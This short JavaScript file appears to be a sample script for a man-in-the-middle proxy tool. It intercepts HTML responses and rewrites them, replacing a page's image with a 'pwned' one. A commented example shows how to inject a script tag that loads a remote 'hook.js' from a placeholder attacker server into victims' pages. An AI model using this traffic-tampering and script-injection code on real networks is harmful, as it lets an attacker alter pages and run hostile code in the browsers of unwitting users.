// called when the script is loaded
function onLoad() {
	log("Script loaded")
}

// called when the request is received by the proxy
function onRequest() {
	log("New request")
}

// called when the request is sent to the real server and a response is received
// in this case: replace the cute kitten image in the response of /kittens.html
function onResponse(req, res) {
	log("New response")
	if(res.ContentType.indexOf('text/html') == 0) {
		var body = res.ReadBody();
		res.Body = body.replace('img src="kittens.jpg"', 'img src="jollypwn.png"');
		log("kittens pwned");
		// example: inject a malicious javascript
		// body.replace('</head>','<script type="text/javascript" src="http://<server>:3000/hook.js"></script></head>')
	}
}

